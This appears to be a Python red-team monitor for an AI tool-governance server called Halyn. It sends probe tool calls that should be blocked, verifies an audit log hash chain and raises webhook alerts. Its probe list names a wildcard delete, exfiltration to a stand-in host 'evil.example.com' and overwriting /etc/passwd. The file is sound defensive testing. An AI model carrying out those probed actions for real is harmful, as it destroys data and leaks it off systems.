# Copyright (c) 2026 Elmadani SALKA
# Licensed under BUSL-1.1. See LICENSE file.

from __future__ import annotations
import asyncio, logging, signal, sys, time
from dataclasses import dataclass, field
from typing import Any

log = logging.getLogger('halyn.redteam')

PROBES = [
    {'name': 'probe.noop',     'tool': 'halyn.probe.noop',
     'args': {'echo': 'ping'},                              'expect': 'any',     'intent': 'redteam.noop'},
    {'name': 'probe.delete',   'tool': 'halyn.probe.delete_all',
     'args': {'target': '*'},                               'expect': 'blocked', 'intent': 'redteam.dangerous'},
    {'name': 'probe.exfil',    'tool': 'halyn.probe.exfil',
     'args': {'destination': 'http://evil.example.com'},    'expect': 'blocked', 'intent': 'redteam.exfil'},
    {'name': 'probe.fs_write', 'tool': 'halyn.probe.write_file',
     'args': {'path': '/etc/passwd', 'content': 'pwned'},  'expect': 'blocked', 'intent': 'redteam.fs'},
]


@dataclass
class ProbeResult:
    name: str; ok: bool; expected: bool; status: str; duration_ms: float; error: str = ''


@dataclass
class LoopStats:
    cycles: int = 0; probes_sent: int = 0; probes_expected: int = 0
    chain_checks: int = 0; chain_breaks: int = 0; alerts_sent: int = 0
    started_at: float = field(default_factory=time.time)
    def uptime_seconds(self): return time.time() - self.started_at


async def _get(session, url):
    import aiohttp
    async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
        return await r.json()


async def _post(session, url, body):
    import aiohttp
    async with session.post(url, json=body, timeout=aiohttp.ClientTimeout(total=5)) as r:
        return await r.json()


async def run_probe(session, base_url, probe):
    t0 = time.perf_counter()
    try:
        resp = await _post(session, base_url + '/execute', {
            'tool': probe['tool'], 'args': probe['args'],
            'user_id': 'halyn.redteam', 'intent': probe['intent'],
        })
        ms = (time.perf_counter() - t0) * 1000
        result_ok = resp.get('ok', False)
        status = resp.get('status', 'unknown')
        expected = (not result_ok) if probe['expect'] == 'blocked' else True
        return ProbeResult(probe['name'], True, expected, status, ms)
    except asyncio.TimeoutError:
        return ProbeResult(probe['name'], False, False, 'timeout',
                           (time.perf_counter() - t0) * 1000, 'timeout')
    except Exception as e:
        return ProbeResult(probe['name'], False, False, 'error',
                           (time.perf_counter() - t0) * 1000, str(e)[:200])


async def check_chain(session, base_url):
    try:
        r = await _get(session, base_url + '/audit/verify')
        return r.get('valid', False), r.get('entries_checked', 0), r.get('message', '')
    except Exception as e:
        return False, 0, 'unreachable: ' + str(e)


async def send_alert(session, webhook, msg, stats):
    log.critical('ALERT: %s', msg)
    stats.alerts_sent += 1
    if not webhook:
        return
    try:
        import aiohttp
        text = (':rotating_light: *Halyn Alert*\n' + msg +
                '\nCycle ' + str(stats.cycles) +
                ' | Uptime ' + str(int(stats.uptime_seconds())) + 's' +
                ' | Chain breaks: ' + str(stats.chain_breaks))
        payload = {'text': text}
        async with session.post(webhook, json=payload,
                                timeout=aiohttp.ClientTimeout(total=5)) as r:
            log.info('alert.webhook status=%d', r.status)
    except Exception as e:
        log.error('alert.webhook failed: %s', e)


async def redteam_loop(base_url, interval, webhook, verbose):
    import aiohttp
    stats = LoopStats()
    prev_tip = None
    print('')
    print('  Halyn Red Team')
    print('  Target:   ' + base_url)
    print('  Interval: ' + str(interval) + 's | Probes: ' + str(len(PROBES))
          + ' | Webhook: ' + ('yes' if webhook else 'no'))
    print('  Ctrl+C to stop')
    print('')
    print('   CYC      TIME    PROBES   CHAIN                      MS')
    print('  ' + '-' * 58)
    async with aiohttp.ClientSession() as session:
        while True:
            t0 = time.time()
            stats.cycles += 1
            try:
                h = await _get(session, base_url + '/health')
            except Exception as e:
                await send_alert(session, webhook, 'Halyn unreachable: ' + str(e), stats)
                await asyncio.sleep(interval)
                continue
            if not h.get('running', False):
                await send_alert(session, webhook, 'running=false', stats)
            results = []
            for probe in PROBES:
                r = await run_probe(session, base_url, probe)
                results.append(r)
                stats.probes_sent += 1
                if r.expected:
                    stats.probes_expected += 1
                else:
                    await send_alert(session, webhook,
                        'Probe ' + r.name + ' unexpected: status=' + r.status
                        + ' expected=' + probe['expect'] + ' error=' + r.error,
                        stats)
                if verbose:
                    log.info('  %s %s -> %s (%.0fms)',
                             'OK' if r.expected else 'FAIL',
                             r.name, r.status, r.duration_ms)
            valid, count, msg = await check_chain(session, base_url)
            stats.chain_checks += 1
            if not valid:
                stats.chain_breaks += 1
                await send_alert(session, webhook,
                    'CHAIN BROKEN cycle=' + str(stats.cycles)
                    + ': ' + msg + ' entries=' + str(count),
                    stats)
            try:
                ar = await _get(session, base_url + '/audit?limit=1')
                tip = ar.get('chain_tip', '')
                if prev_tip and tip == 'GENESIS' and stats.cycles > 1:
                    await send_alert(session, webhook,
                        'Chain tip reset to GENESIS at cycle ' + str(stats.cycles)
                        + ' - log may have been wiped', stats)
                prev_tip = tip
            except Exception:
                pass
            n_ok = sum(1 for r in results if r.expected)
            chain_str = ('OK (' + str(count) + ' entries)'
                         if valid else 'BROKEN (' + str(count) + ' entries)')
            ms = (time.time() - t0) * 1000
            print('  ' + str(stats.cycles).rjust(4)
                  + '  ' + time.strftime('%H:%M:%S')
                  + '  ' + str(n_ok) + '/' + str(len(results)) + ' probes'
                  + '  ' + chain_str.ljust(26)
                  + '  ' + str(int(ms)).rjust(5) + 'ms')
            await asyncio.sleep(max(0.0, interval - (time.time() - t0)))


def run(url='http://localhost:7420', interval=30.0, webhook=None, verbose=False):
    try:
        import aiohttp  # noqa
    except ImportError:
        print('Error: aiohttp required -- pip install halyn')
        sys.exit(1)
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s %(name)s %(levelname)s %(message)s',
        datefmt='%H:%M:%S',
    )
    loop = asyncio.new_event_loop()
    def _stop(sig, frame):
        print('\n  Stopping...')
        loop.stop()
    signal.signal(signal.SIGINT, _stop)
    signal.signal(signal.SIGTERM, _stop)
    try:
        loop.run_until_complete(redteam_loop(url, interval, webhook, verbose))
    finally:
        loop.close()